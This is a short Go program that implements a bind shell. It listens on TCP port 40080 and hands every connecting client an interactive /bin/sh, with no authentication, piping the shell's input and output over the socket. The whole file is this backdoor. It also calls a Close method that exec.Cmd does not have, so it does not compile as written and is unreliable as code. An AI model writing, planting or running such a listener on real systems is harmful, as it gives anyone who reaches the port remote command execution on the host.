package main

import (
	"io"
	"log"
	"net"
	"os/exec"
)

func handle(conn net.Conn) {
	shell := exec.Command("/bin/sh", "-i")
	rp, wp := io.Pipe()
	shell.Stdin = conn
	shell.Stdout = wp
	go io.Copy(conn, rp)
	shell.Run()
	shell.Close()
}

func main() {
	listener, err := net.Listen("tcp", ":40080")
	if err != nil {
		log.Fatalln(err)
	}

	for {
		conn, err := listener.Accept()
		if err != nil {
			log.Fatalln(err)
		}
		go handle(conn)
	}
}
